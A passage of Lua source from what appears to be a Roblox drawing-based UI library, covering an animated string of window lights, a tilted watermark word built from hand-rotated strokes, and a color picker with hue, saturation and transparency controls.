                    main = utility:Draw('Line', {Thickness = 1.6, Color = wireColor, Transparency = 1, Visible = false, ZIndex = z + 4}),
                    shine = utility:Draw('Line', {Thickness = .8, Color = wireShine, Transparency = 1, Visible = false, ZIndex = z + 4}),
                }
            end

            local function newHook()
                return utility:Draw('Circle', {Filled = true, NumSides = 8, Radius = 1.8, Color = hookColor, Transparency = 1, Visible = false, ZIndex = z + 5})
            end

            local function showBulb(b, shown)
                if b.shown == shown then return end
                b.shown = shown
                for _, part in ipairs(b.parts) do
                    setShown(part, shown)
                end
            end

            local function showWire(w, shown)
                setShown(w.main, shown)
                setShown(w.shine, shown)
            end

            -- // Colors (every palette is a list; 'theme' and 'rainbow' are built here)
            local function getPalette()
                local name = cfg.palette
                if name == 'theme' then
                    local accent = library.theme['Accent'] or white
                    return {accent, accent:Lerp(white, .45), accent:Lerp(black, .25)}
                elseif name == 'rainbow' then
                    local list = {}
                    for i = 0, 5 do
                        list[i + 1] = fromhsv(i / 6, .75, 1)
                    end
                    return list
                end
                local pal = library.lightPalettes[name] or library.lightPalettes.classic
                if typeof(pal) ~= 'table' or #pal == 0 then
                    pal = library.lightPalettes.classic
                end
                return pal
            end

            -- // State
            local broken = false
            local hidden = true
            local wasOpen, openedAt, closedAt = false, 0, -10
            local lastUpdate = 0
            local lastPos, lastSize = nil, nil

            local function hideStrand()
                for _, b in ipairs(bulbs) do showBulb(b, false) end
                for _, w in ipairs(wires) do showWire(w, false) end
                for _, h in ipairs(hooks) do setShown(h, false) end
                hidden = true
            end

            local function updateLights(now, stripData)
                local pos, size = stripData.AbsolutePosition, stripData.AbsoluteSize

                -- open / close bookkeeping (the strand fades in, powers on, and fades out with the menu)
                if window.open and not wasOpen then
                    wasOpen = true
                    openedAt = now
                elseif not window.open and wasOpen then
                    wasOpen = false
                    closedAt = now
                end

                local alpha
                if window.open then
                    alpha = clamp((now - openedAt) / .2, 0, 1)
                else
                    alpha = 1 - clamp((now - closedAt) / .18, 0, 1)
                end

                local wantShadow = cfg.shadow and true or false
                for _, layer in ipairs(shadowLayers) do
                    setShown(layer, wantShadow)
                end

                if not cfg.enabled or alpha <= 0 then
                    if not hidden then hideStrand() end
                    return
                end
                hidden = false

                -- // Layout: drapes from hook to hook across the top strip
                local x0, x1 = pos.X + INSET, pos.X + size.X - INSET
                local hookY = pos.Y + 3
                local span = math.max(x1 - x0, 20)
                local drapes = math.max(floor(span / math.max(tonumber(cfg.swag) or 84, 30) + .5), 1)
                local drapeW = span / drapes
                local sag = math.max(tonumber(cfg.sag) or 9, 0)
                local perDrape = clamp(floor(tonumber(cfg.perSwag) or 3), 1, 8)
                local SEG = 10 -- wire lines per drape

                local count = drapes * perDrape
                local wireCount = drapes * SEG
                while #bulbs < count do table.insert(bulbs, newBulb()) end
                while #wires < wireCount do table.insert(wires, newWire()) end
                while #hooks < drapes + 1 do table.insert(hooks, newHook()) end
                for i = count + 1, #bulbs do showBulb(bulbs[i], false) end
                for i = wireCount + 1, #wires do showWire(wires[i], false) end
                for i = drapes + 2, #hooks do setShown(hooks[i], false) end

                -- wire height at u (0..1) along a drape: a smooth droop, deepest in the middle
                local function wireAt(d, u)
                    return newVector2(x0 + (d + u) * drapeW, hookY + sag * 4 * u * (1 - u))
                end

                for d = 0, drapes - 1 do
                    for s = 1, SEG do
                        local a, b = wireAt(d, (s - 1) / SEG), wireAt(d, s / SEG)
                        local w = wires[d * SEG + s]
                        showWire(w, true)
                        w.main.Object.From, w.main.Object.To = a, b
                        w.main.Object.Transparency = alpha
                        w.shine.Object.From, w.shine.Object.To = a - newVector2(0, .5), b - newVector2(0, .5)
                        w.shine.Object.Transparency = .6 * alpha
                    end
                end

                for h = 1, drapes + 1 do
                    local hook = hooks[h]
                    setShown(hook, true)
                    hook.Object.Position = newVector2(x0 + (h - 1) * drapeW, hookY)
                    hook.Object.Transparency = alpha
                end

                -- // Colors: every colorStep seconds each color moves one bulb along the strand
                local pal = getPalette()
                local n = #pal
                local stepTime = tonumber(cfg.colorStep) or 0
                local direction = cfg.reverse and -1 or 1
                local step, blend = 0, 1
                if stepTime > 0 then
                    local t = now / stepTime
                    step = floor(t)
                    -- quick crossfade at the start of each step, then the color holds
                    blend = clamp((t - step) * stepTime / math.min(.12, stepTime * .5), 0, 1)
                end

                local r = math.max(tonumber(cfg.bulbSize) or 3.2, 1)
                local glow = math.max(tonumber(cfg.glow) or 1, 0)
                local twinkle = clamp(tonumber(cfg.twinkle) or 0, 0, 1)
                local sway = math.max(tonumber(cfg.sway) or 1, 0)
                local powerOn = tonumber(cfg.powerOn) or 0
                local socketLen = r * .9 + 1

                for k = 1, count do
                    local b = bulbs[k]
                    showBulb(b, true)

                    -- where on the wire this bulb is clipped on
                    local d = floor((k - 1) / perDrape)
                    local i = (k - 1) % perDrape + 1
                    local attach = wireAt(d, i / (perDrape + 1))

                    -- hangs straight down, with a small alternating tilt and a gentle swing (a ripple along the strand)
                    local tilt = ((k % 2 == 0) and .1 or -.1)
                    local swing = math.sin(now * 1.6 + attach.X * .035) * .12 * sway
                    local angle = tilt + swing
                    local dir = newVector2(math.sin(angle), math.cos(angle))
                    local across = newVector2(-dir.Y, dir.X)

                    local socketEnd = attach + dir * socketLen
                    local center = socketEnd + dir * (r * .85)

                    -- color of this bulb (with a quick fade when it switches)
                    local cur = pal[((k - 1 - direction * step) % n) + 1]
                    local color = cur
                    if blend < 1 then
                        local prev = pal[((k - 1 - direction * (step - 1)) % n) + 1]
                        color = prev:Lerp(cur, blend)
                    end

                    -- brightness: twinkle dips + sparkles, power-on sequence left to right
                    local bright = 1
                    local sparkle = 0
                    if twinkle > 0 then
                        local seed = b.seed
                        local dip = math.max(0, math.sin(now * (1.3 + (seed % 1) * 1.7) + seed)) ^ 8
                        bright *= 1 - twinkle * dip * .8
                        sparkle = twinkle * math.max(0, math.sin(now * (.9 + (seed % .7)) + seed * 2)) ^ 30
                    end
                    if powerOn > 0 then
                        -- while closing, freeze the power-on where it was when the menu closed,
                        -- so bulbs that hadn't switched on yet stay off while the strand fades out
                        local litTime = window.open and now or closedAt
                        local onAt = openedAt + powerOn * ((k - 1) / count)
                        bright *= clamp((litTime - onAt) / .12, 0, 1)
                    end

                    local bodyColor = color:Lerp(black, .72):Lerp(color, bright)
                    if sparkle > 0 then
                        bodyColor = bodyColor:Lerp(white, sparkle * .7)
                    end

                    local socket, body, tip, shine = b.socket.Object, b.body.Object, b.tip.Object, b.shine.Object
                    local gi, go = b.glowInner.Object, b.glowOuter.Object

                    socket.From, socket.To = attach, socketEnd
                    socket.Thickness = math.max(r * 1.1, 2.5)
                    socket.Transparency = alpha

                    body.Position = center
                    body.Radius = r
                    body.Color = bodyColor
                    body.Transparency = alpha

                    tip.PointA = center + across * (r * .92)
                    tip.PointB = center - across * (r * .92)
                    tip.PointC = center + dir * (r * 2.2)
                    tip.Color = bodyColor
                    tip.Transparency = alpha

                    shine.Position = center - across * (r * .35) - dir * (r * .2)
                    shine.Radius = math.max(r * .32, .8)
                    shine.Transparency = alpha * .55 * bright

                    local glowCenter = center + dir * (r * .6)
                    gi.Position = glowCenter
                    gi.Radius = r * 2.3
                    gi.Color = color
                    gi.Transparency = clamp(.28 * glow * bright * alpha, 0, 1)
                    go.Position = glowCenter
                    go.Radius = r * 4
                    go.Color = color
                    go.Transparency = clamp((.09 + .08 * sparkle) * glow * bright * alpha, 0, 1)
                end
            end

            utility:Connection(runservice.RenderStepped, function()
                if broken then return end
                local stripData = strip.Object and library.drawings[strip.Object]
                if not stripData then return end -- unloaded

                local now = os.clock()
                local moved = stripData.AbsolutePosition ~= lastPos or stripData.AbsoluteSize ~= lastSize
                local stateChanged = wasOpen ~= window.open
                local fading = (not window.open) and (now - closedAt) < .25
                local active = window.open or fading or not hidden
                if not active and not stateChanged and not moved then
                    return
                end

                local interval = 1 / math.max(tonumber(cfg.fps) or 40, 1)
                if not moved and not stateChanged and now - lastUpdate < interval then
                    return
                end
                lastUpdate = now
                lastPos, lastSize = stripData.AbsolutePosition, stripData.AbsoluteSize

                local ok, err = pcall(updateLights, now, stripData)
                if not ok then
                    broken = true
                    pcall(hideStrand)
                    log('window lights stopped: '..tostring(err))
                end
            end)
        end)
        if not lightsOk then
            log('window lights disabled: '..tostring(lightsErr))
        end
        -------------------------

        ---- Backdrop word ----
        -- A big word (library.backdrop.text) drawn tilted in the middle of the content panel, above the
        -- panel's background but below the sections, so it shows through the gaps like a watermark.
        -- Drawing text can't rotate, so the letters are built from thick rounded strokes
        -- (library.backdropGlyphs) that are rotated by hand. They're drawn fully opaque in a color mixed
        -- from the panel background and the accent, so overlapping strokes never look darker.
        -- Every stroke is a child of the panel, so it's part of the window: it moves, opens and fades
        -- exactly with it. Only re-laid out when the panel size, theme or a backdrop setting changes.
        local backdropOk, backdropErr = pcall(function()
            local cfg = library.backdrop
            local objs = window.objects
            local panel = objs.groupBackground
            local z = library.zindexOrder.window + 6 -- above the panel (z+5), below the sections (z+15)

            local lines, dots = {}, {}
            local shapeKey, shape = nil, nil -- strokes of the current text in em units
            local lastKey = nil
            local broken = false

            -- turns the text into line segments + joint points (em units), plus its size
            local function buildShape(text)
                local segs, points = {}, {}
                local x = 0
                local gap = .18
                local first = true
                for ch in tostring(text):lower():gmatch('.') do
                    local glyph = library.backdropGlyphs[ch]
                    if glyph then
                        if not first then x += gap end
                        first = false
                        for _, stroke in ipairs(glyph.strokes) do
                            local pts = {}
                            if stroke[1] == 'line' then
                                for i = 2, #stroke do
                                    pts[#pts + 1] = {x + stroke[i][1], stroke[i][2]}
                                end
                            elseif stroke[1] == 'arc' then
                                local cx, cy, rx, ry, a0, a1 = stroke[2], stroke[3], stroke[4], stroke[5], stroke[6], stroke[7]
                                local steps = math.max(floor(math.abs(a1 - a0) / 12 + .5), 2)
                                for i = 0, steps do
                                    local a = math.rad(a0 + (a1 - a0) * i / steps)
                                    pts[#pts + 1] = {x + cx + rx * math.cos(a), cy + ry * math.sin(a)}
                                end
                            end
                            for i = 1, #pts do
                                points[#points + 1] = pts[i]
                                if i > 1 then
                                    segs[#segs + 1] = {pts[i - 1], pts[i]}
                                end
                            end
                        end
                        x += glyph.width
                    end
                end
                return {segs = segs, points = points, width = math.max(x, .01), top = 1, bottom = -.45}
            end

            local function setShown(drawing, visible)
                if drawing.Visible ~= visible then
                    drawing.Visible = visible
                end
            end

            local function hideAll()
                for _, l in ipairs(lines) do setShown(l, false) end
                for _, d in ipairs(dots) do setShown(d, false) end
            end

            -- lays the word out in the panel's own coordinates. the strokes are children of the panel,
            -- so the core layout moves them with the window in the same update (they can't lag or
            -- drift), and the window's open/close fade handles their transparency.
            local function layout(panelSize)
                if not cfg.enabled or tostring(cfg.text or '') == '' then
                    hideAll()
                    return
                end

                local base = library.theme['Group Background'] or c3new(0, 0, 0)
                local tint = library.theme[cfg.color] or library.theme['Accent'] or c3new(1, 1, 1)
                local color = base:Lerp(tint, clamp(tonumber(cfg.opacity) or .09, 0, 1))

                if shapeKey ~= cfg.text then
                    shapeKey = cfg.text
                    shape = buildShape(cfg.text)
                end

                -- scale so the tilted word fits inside the panel
                local angle = math.rad(tonumber(cfg.angle) or 30)
                local cos, sin = math.cos(angle), math.sin(angle)
                local w, h = shape.width, shape.top - shape.bottom
                local fill = clamp(tonumber(cfg.size) or .8, .1, 1)
                local scale = math.min(
                    panelSize.X * fill / math.max(w * math.abs(cos) + h * math.abs(sin), .01),
                    panelSize.Y * fill / math.max(w * math.abs(sin) + h * math.abs(cos), .01)
                )
                local thick = math.max((tonumber(cfg.weight) or .17) * scale, 1)
                local center = panelSize / 2
                local midX, midY = w / 2, (shape.top + shape.bottom) / 2

                -- em point -> offset inside the panel (rotated so the word rises to the right)
                local function toPanel(p)
                    local vx, vy = (p[1] - midX) * scale, -(p[2] - midY) * scale
                    return center + newVector2(vx * cos + vy * sin, -vx * sin + vy * cos)
                end

                local segs, points = shape.segs, shape.points
                while #lines < #segs do
                    table.insert(lines, utility:Draw('Line', {Thickness = 1, Transparency = 1, Visible = false, ZIndex = z, Parent = panel}))
                end
                while #dots < #points do
                    table.insert(dots, utility:Draw('Circle', {Filled = true, NumSides = 16, Radius = 1, Transparency = 1, Visible = false, ZIndex = z, Parent = panel}))
                end

                for i, l in ipairs(lines) do
                    local seg = segs[i]
                    if seg then
                        l.Object.Thickness = thick
                        l.Object.Color = color
                        l:SetPoints(toPanel(seg[1]), toPanel(seg[2]))
                    end
                    setShown(l, seg ~= nil)
                end
                -- round caps / joints so the strokes look smooth
                for i, d in ipairs(dots) do
                    local p = points[i]
                    if p then
                        d.Object.Radius = thick / 2
                        d.Object.Color = color
                        d.Position = toPanel(p)
                    end
                    setShown(d, p ~= nil)
                end
            end

            -- only re-layout when the panel's size, the theme or a backdrop setting changes
            -- (moving the window needs nothing here, the panel carries the strokes along)
            utility:Connection(runservice.RenderStepped, function()
                if broken then return end
                local panelData = panel.Object and library.drawings[panel.Object]
                if not panelData then return end -- unloaded
                local base = library.theme['Group Background']
                local tint = library.theme[cfg.color] or library.theme['Accent']
                local key = table.concat({tostring(panelData.AbsoluteSize), tostring(cfg.enabled), tostring(cfg.text),
                    tostring(cfg.angle), tostring(cfg.size), tostring(cfg.weight), tostring(cfg.opacity),
                    tostring(base), tostring(tint)}, '|')
                if key == lastKey then return end
                lastKey = key
                local ok, err = pcall(layout, panelData.AbsoluteSize)
                if not ok then
                    broken = true
                    pcall(hideAll)
                    log('backdrop stopped: '..tostring(err))
                end
            end)
        end)
        if not backdropOk then
            log('backdrop disabled: '..tostring(backdropErr))
        end
        -------------------------

        -- Create Color Picker --
        do
            -- Objects
            do
                local objs = window.colorpicker.objects;
                local z = library.zindexOrder.colorpicker;

                objs.background = utility:Draw('Square', {
                    Visible = false;
                    Size = newUDim2(0,200,0,242);
                    Position = newUDim2(1,-200,1,10);
                    ThemeColor = 'Background';
                    ZIndex = z;
                    Parent = window.objects.background;
                })

                objs.border1 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z-1;
                    Parent = objs.background;
                })

                objs.border2 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border 1';
                    ZIndex = z-2;
                    Parent = objs.border1;
                })

                objs.border3 = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z-3;
                    Parent = objs.border2;
                })

                objs.statusText = utility:Draw('Text', {
                    Position = newUDim2(0,5,0,4);
                    Text = 'colorpicker_status_text';
                    ThemeColor = 'Option Text 1';
                    Size = 13;
                    Font = 2;
                    Outline = true;
                    ZIndex = z+1;
                    Parent = objs.background;
                })

                objs.mainColor = utility:Draw('Square', {
                    Size = newUDim2(0, 175, 0, 175);
                    Position = newUDim2(0, 5, 0, 25);
                    Color = c3new(1,0,0);
                    ZIndex = z+2;
                    Parent = objs.background;
                })

                objs.sat1 = utility:Draw('Image', {
                    Size = newUDim2(1,0,1,0);
                    Data = base64decode"iVBORw0KGgoAAAANSUhEUgAAAaQAAAGkCAQAAADURZm+AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQflBwwSLzK3wl3KAAADrElEQVR42u3TORLCMBBFwT+6/50hMqXSZgonBN0BWCDGYPwqeSWVZPWYVHd0Pc5H86v9areu4Sz9u7XZXT/vvtZtu6dtJtYw525iGya05afnWW17ltPE8fzfTZy/yf3vmCes59xf0Sf/42l3lnvGOyyH+y/bo/X689wCPCYkEBIICYQECAmEBEICIQFCAiGBkEBIgJBASCAkEBIgJBASCAmEBAgJhARCAiEBQgIhgZAAIYGQQEggJEBIICQQEggJEBIICYQEQgKEBEICIYGQACGBkEBIICRASCAkEBIICRASCAmEBAgJhARCAiEBQgIhgZBASICQQEggJBASICQQEggJhAQICYQEQgIhAUICIYGQQEguAQgJhARCAoQEQgIhgZAAIYGQQEggJEBIICQQEggJEBIICYQEQgKEBEICIYGQACGBkEBIgJBASCAkEBIgJBASCAmEBAgJhARCAiEBQgIhgZBASICQQEggJBASICQQEggJhAQICYQEQgKEBEICIYGQACGBkEBIICRASCAkEBIICRASCAmEBEIChARCAiGBkAAhgZBASCAkQEggJBASICQQEggJhAQICYQEQgIhAUICIYGQQEiAkEBIICQQEiAkEBIICYQECAmEBEIChARCAiGBkAAhgZBASCAkQEggJBASCAkQEggJhARCAoQEQgIhgZAAIYGQQEggJEBIICQQEiAkEBIICYQECAmEBEICIQFCAiGBkEBIgJBASCAkEBIgJBASCAmEBAgJhARCAiEBQgIhgZAAIYGQQEggJEBIICQQEggJEBIICYQEQgKEBEICIYGQACGBkEBIICRASCAkEBIgJBASCAmEBAgJhARCAiEBQgIhgZBASICQQEggJBASICQQEggJhAQICYQEQgIhAUICIYGQACGBkEBIICRASCAkEBIICRASCAmEBEIChARCAiGBkAAhgZBASCAkQEggJBASCAkQEggJhAQICYQEQgIhAUICIYGQQEiAkEBIICQQEiAkEBIICYQECAmEBEICIQFCAiGBkEBILgEICYQEQgKEBEICIYGQACGBkEBIICRASCAkEBIICRASCAmEBEIChARCAiGBkAAhgZBASICQQEggJBASICQQEggJhAQICYQEQgIhAUICIYGQQEiAkEBIICQQEiAkEBIICYQECAmEBEIChARCAiGBkAAhgZBASCAkQEggJBASCAkQEggJhARCAoQEQgIhgZAAIYGQQEggJEBIICQQEiAkEBL8lzft9AVFFzN+ywAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMS0wNy0xMlQxODo0Nzo1MCswMDowMIxlM90AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjEtMDctMTJUMTg6NDc6NTArMDA6MDD9OIthAAAAAElFTkSuQmCC";
                    ZIndex = z+3;
                    Parent = objs.mainColor;
                })

                objs.sat2 = utility:Draw('Image', {
                    Size = newUDim2(1,0,1,0);
                    Data = base64decode"iVBORw0KGgoAAAANSUhEUgAAAaQAAAGkCAQAAADURZm+AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQflBwwSLyBEeyyCAAAD4klEQVR42u3YwQnAQAhFQTek/5pz9eBtEYzMlBD4PDcRADDBieMjwK3HJwBDghFepx0oEhgSOO0ARQJDAqcdKBJgSGBI4I0EhgQ47cCQwJDAGwlQJDAkcNqBIgGKBIoEhgROO0CRQJFAkQBDAqcdGBI47QBFAkUCQwKnHaBIoEigSKBIgCKBIYHTDhQJUCQwJHDagSIBigSGBE47UCRAkcCQwGkHKBIoEigSGBLgtANDAkMCbyTAkMBpB4oEigQoEhgSOO1AkQBDAqcdKBIoEqBIYEjgtANFUiRQJFAkMCTAaQeKBIoEigQYEjjtQJFAkQBFAkMCpx0oEmBI4LQDRQJFAhQJDAmcdqBIgCKBIoEhAU47UCRQJFAkwJDAaQeKBIYEOO1AkUCRYHuRTAmcduC0A0UCFAkUCQwJnHaAIoEigSKBIQFOO2gvkimBIoE3EhgS4LQDRQJDAqcdoEigSKBIYEiAIYEhwXx+NoAigSGB0w5QJDAkMCQwJKDiZwMoEhgSOO0ARQJFgnlFMiVw2oHTDhQJUCRQJDAkcNoBVZFMCRQJvJHAkACnHSgSKBIoElANSZPAaQdOOzAkwGkHigSGBIYEGBK08LMBFAkUCRQJMCQwJDAkWMjPBlAkMCRw2gG5SKYEigTeSGBIgNMOFAkMCQwJMCRo4WcDKBIYEjjtgFwkUwJFAm8kMCTAaQeKBIoEigRUQ9IkcNqB0w4MCXDagSKBIsHCIpkSOO3AaQeKBCgSKBIYEhgSYEjQws8GUCQwJHDaAblIpgSKBN5IYEiA0w4UCQwJDAkwJGjhZwMoEhgSOO0ARQJDAkMCQwIqfjaAIoEigSIBhgROO5hXJFMCpx047UCRAEUCRQJDAqcdUBXJlECRwBsJDAlw2oEigSKBIgGGBIYEhgSL+dkAigSGBE47QJHAkMBpB4oEGBIYEhgSrOZnAygSKBIoEmBI4LQDRQJFAhQJDAmcdrC8SKYEigTeSGBIgNMOFAkMCZx2gCKBIoEigSEBTjtQJFAkUCTAkMBpB4oEigQoEhgSOO1AkQBDAqcdKBKgSKBIYEjgtAMUCRQJFAkMCXDagSKBIoEiAYYETjtQJFAkQJHAkMBpB4oEGBI47UCRQJEARQJDAqcdoEigSGBI4LQDFAkUCRQJFAkwJHDagSKBIQFOOzAkMCTwRgIMCZx2oEigSIAigSKBIYHTzkcARQJFAkMCnHZgSGBI4I0EGBI47UCRQJEAQwKnHSgSKBKgSGBI4LQDRQIUCRQJDAmcdoAigSGB0w5QJFAkUCQwJMBpB4oEhgROO0CRwJDAkMAbCVAkMCT4gw/reQYigE05fAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMS0wNy0xMlQxODo0NzozMiswMDowMN2VK3MAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjEtMDctMTJUMTg6NDc6MzIrMDA6MDCsyJPPAAAAAElFTkSuQmCC";
                    ZIndex = z+4;
                    Parent = objs.mainColor;
                })

                objs.colorBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z+1;
                    Parent = objs.mainColor;
                })

                objs.mainDetector = utility:Draw('Square',{
                    Size = newUDim2(1,0,1,0);
                    Transparency = 0;
                    ZIndex = z+10;
                    Parent = objs.mainColor;
                })

                objs.hue = utility:Draw('Image', {
                    Size = newUDim2(0,175,0,10);
                    Position = newUDim2(0,5,0,205);
                    Data = library.images.colorhue;
                    ZIndex = z+2;
                    Parent = objs.background;
                })

                objs.hueBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z+1;
                    Parent = objs.hue;
                })

                objs.hueDetector = utility:Draw('Square',{
                    Size = newUDim2(1,0,1,0);
                    Transparency = 0;
                    ZIndex = z+10;
                    Parent = objs.hue;
                })

                objs.transColor = utility:Draw('Square', {
                    Size = newUDim2(0,10,0,175);
                    Position = newUDim2(0,185,0,25);
                    Color = c3new(1,0,0);
                    ZIndex = z+2;
                    Parent = objs.background;
                })

                objs.trans = utility:Draw('Image', {
                    Size = newUDim2(1,0,1,0);
                    Data = library.images.colortrans;
                    ZIndex = z+3;
                    Parent = objs.transColor;
                })

                objs.transBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    ThemeColor = 'Border';
                    ZIndex = z+1;
                    Parent = objs.transColor;
                })

                objs.transDetector = utility:Draw('Square',{
                    Size = newUDim2(1,0,1,0);
                    Transparency = 0;
                    ZIndex = z+10;
                    Parent = objs.transColor;
                })

                objs.pointer = utility:Draw('Square', {
                    Size = newUDim2(0,2,0,2);
                    Position = newUDim2(0,0,0,0);
                    Color = c3new(1,1,1);
                    ZIndex = z+6;
                    Parent = objs.mainColor;
                })

                objs.pointerBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+5;
                    Parent = objs.pointer;
                })

                objs.hueSlider = utility:Draw('Square', {
                    Size = newUDim2(0,1,1,0);
                    Color = c3new(1,1,1);
                    ZIndex = z+4;
                    Parent = objs.hue;
                })

                objs.hueSliderBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+3;
                    Parent = objs.hueSlider;
                })

                objs.transSlider = utility:Draw('Square', {
                    Size = newUDim2(1,0,0,1);
                    Color = c3new(1,1,1);
                    ZIndex = z+5;
                    Parent = objs.trans;
                })

                objs.transSliderBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+4;
                    Parent = objs.transSlider;
                })

                objs.rBackground = utility:Draw('Square', {
                    Size = newUDim2(0, 60, 0, 15);
                    Position = newUDim2(0, 5, 1, - 20);
                    ThemeColor = 'Option Background';
                    Parent = objs.background;
                    ZIndex = z+5;
                })

                objs.rBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+4;
                    Parent = objs.rBackground;
                })

                objs.rText = utility:Draw('Text', {
                    Position = newUDim2(.5,0,0,0);
                    Color = c3new(1,.1,.1);
                    Text = 'R';
                    Size = 13;
                    Font = 2;
                    Outline = true;
                    Center = true;
                    ZIndex = z+6;
                    Parent = objs.rBackground;
                })

                objs.gBackground = utility:Draw('Square', {
                    Size = newUDim2(0, 60, 0, 15);
                    Position = newUDim2(0, 70, 1, - 20);
                    ThemeColor = 'Option Background';
                    Parent = objs.background;
                    ZIndex = z+5;
                })

                objs.gBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+4;
                    Parent = objs.gBackground;
                })

                objs.gText = utility:Draw('Text', {
                    Position = newUDim2(.5,0,0,0);
                    Color = c3new(.1,1,.1);
                    Text = 'G';
                    Size = 13;
                    Font = 2;
                    Outline = true;
                    Center = true;
                    ZIndex = z+6;
                    Parent = objs.gBackground;
                })

                objs.bBackground = utility:Draw('Square', {
                    Size = newUDim2(0, 60, 0, 15);
                    Position = newUDim2(0, 135, 1, - 20);
                    ThemeColor = 'Option Background';
                    Parent = objs.background;
                    ZIndex = z+5;
                })

                objs.bBorder = utility:Draw('Square', {
                    Size = newUDim2(1,2,1,2);
                    Position = newUDim2(0,-1,0,-1);
                    Color = c3new(0,0,0);
                    ZIndex = z+4;
                    Parent = objs.bBackground;
                })

                objs.bText = utility:Draw('Text', {
                    Position = newUDim2(.5,0,0,0);
                    Color = c3new(.1,.1,1);
                    Text = 'B';
                    Size = 13;
                    Font = 2;
                    Outline = true;
                    Center = true;
                    ZIndex = z+6;
                    Parent = objs.bBackground;
                })

                local draggingHue, draggingSat, draggingTrans = false, false, false;

                local function updateSatVal(pos)
                    if window.colorpicker.selected ~= nil then
                        local hue, sat, val = window.colorpicker.selected.color:ToHSV()
                        local mainPos, mainSize = objs.mainColor.Object.Position, objs.mainColor.Object.Size
                        local X = math.clamp((pos.X - mainPos.X) / math.max(mainSize.X, 1), 0, 0.995)
                        local Y = math.clamp((pos.Y - mainPos.Y) / math.max(mainSize.Y, 1), 0, 0.995)
                        sat, val = 1 - X, 1 - Y;
                        window.colorpicker.selected:SetColor(fromhsv(hue,sat,val));
                        window.colorpicker:Visualize(fromhsv(hue, sat, val), window.colorpicker.selected.trans);
                    end
                end

                local function updateHue(pos)
                    if window.colorpicker.selected ~= nil then
                        local hue, sat, val = window.colorpicker.selected.color:ToHSV()
                        local huePos, hueSize = objs.hue.Object.Position, objs.hue.Object.Size
                        local X = math.clamp((pos.X - huePos.X) / math.max(hueSize.X, 1), 0, 0.995)
                        hue = 1 - X
                        window.colorpicker.selected:SetColor(fromhsv(hue,sat,val));
                        window.colorpicker:Visualize(fromhsv(hue, sat, val), window.colorpicker.selected.trans);
                    end
                end

                local function updateTrans(pos)
                    if window.colorpicker.selected ~= nil then
                        local transPos, transSize = objs.transColor.Object.Position, objs.transColor.Object.Size
                        local Y = math.clamp((pos.Y - transPos.Y) / math.max(transSize.Y, 1), 0, 0.995)
                        window.colorpicker.selected:SetTrans(Y);
                        window.colorpicker:Visualize(window.colorpicker.selected.color, Y);
                    end
                end

                utility:Connection(objs.mainDetector.MouseButton1Down, function(pos)
                    draggingSat = true;
                    updateSatVal(pos)
                end)

                utility:Connection(objs.hueDetector.MouseButton1Down, function(pos)
                    draggingHue = true;
                    updateHue(pos)
                end)

                utility:Connection(objs.transDetector.MouseButton1Down, function(pos)
                    draggingTrans = true;
                    updateTrans(pos)
                end)

                utility:Connection(mousemove, function(pos)
                    if library.open then
                        if draggingSat then
                            updateSatVal(pos)
                        elseif draggingHue then
                            updateHue(pos)
                        elseif draggingTrans then
                            updateTrans(pos)
                        end
                    end
                end)

                utility:Connection(button1up, function()
                    draggingSat = false;
                    draggingHue = false;
                    draggingTrans = false;
                end)

            end

            function window.colorpicker:Visualize(c3, a)
                if typeof(c3) ~= 'Color3' then return end
                if typeof(a) ~= 'number' then return end
                local h,s,v = c3:ToHSV();
                h = h == 0 and 1 or h;
                self.color = c3;
                self.trans = a;
                self.objects.mainColor.Color = fromhsv(h,1,1);
                self.objects.transColor.Color = fromhsv(h,s,v);
                self.objects.hueSlider.Position = newUDim2(1 - h, 0,0,0);
                self.objects.transSlider.Position = newUDim2(0,0,a,0);
                self.objects.pointer.Position = newUDim2(1 - s, 0, 1 - v, 0);
                self.objects.statusText.Text = 'Editing : Unknown';
                if self.selected ~= nil then
                    local txt = 'Editing : Unknown';
                    if self.selected.text ~= nil and self.selected.text ~= '' then
                        txt = tostring(self.selected.text)
                    elseif self.selected.flag ~= nil and self.selected.flag ~= '' then
                        txt = tostring(self.selected.flag)
                    end
                    self.objects.statusText.Text = tostring(txt);
                end
            end
            
            window.colorpicker:Visualize(window.colorpicker.color, window.colorpicker.trans)

        end
        -------------------------

        ---- Create Dropdown ----
        do
            -- Default Objects
            do
                local objs = window.dropdown.objects;
